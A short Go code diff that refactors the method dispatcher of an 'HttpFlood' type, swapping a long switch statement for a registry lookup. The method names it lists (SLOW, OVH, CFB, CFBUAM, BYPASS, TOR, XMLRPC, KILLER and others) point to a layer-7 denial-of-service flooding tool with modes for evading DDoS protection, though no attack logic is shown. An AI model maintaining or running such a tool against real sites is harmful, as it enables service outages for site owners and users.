@@ -60,53 +60,13 @@ func (h *HttpFlood) Run(ctx context.Context) {
 	}
 }
 
+// dispatch resolves the method via l7Registry (Strategy Pattern).
 func (h *HttpFlood) dispatch() {
-	switch h.Method {
-	case "GET":
-		h.get()
-	case "POST":
-		h.post()
-	case "HEAD":
-		h.head()
-	case "OVH":
-		h.ovh()
-	case "STRESS":
-		h.stress()
-	case "DYN":
-		h.dyn()
-	case "SLOW":
-		h.slow()
-	case "NULL":
-		h.null()
-	case "COOKIE":
-		h.cookie()
-	case "PPS":
-		h.pps()
-	case "EVEN":
-		h.even()
-	case "GSB":
-		h.gsb()
-	case "BOT":
-		h.bot()
-	case "APACHE":
-		h.apache()
-	case "XMLRPC":
-		h.xmlrpc()
-	case "CFB", "CFBUAM", "BYPASS", "DGB", "AVB":
-		h.bypass()
-	case "TOR":
-		h.tor()
-	case "RHEX":
-		h.rhex()
-	case "STOMP":
-		h.stomp()
-	case "DOWNLOADER":
-		h.downloader()
-	case "KILLER":
-		h.killer()
-	default:
-		h.get()
+	fn, ok := l7Registry[h.Method]
+	if !ok {
+		fn = (*HttpFlood).get
 	}
+	fn(h)
 }
 
 func (h *HttpFlood) ua() string {
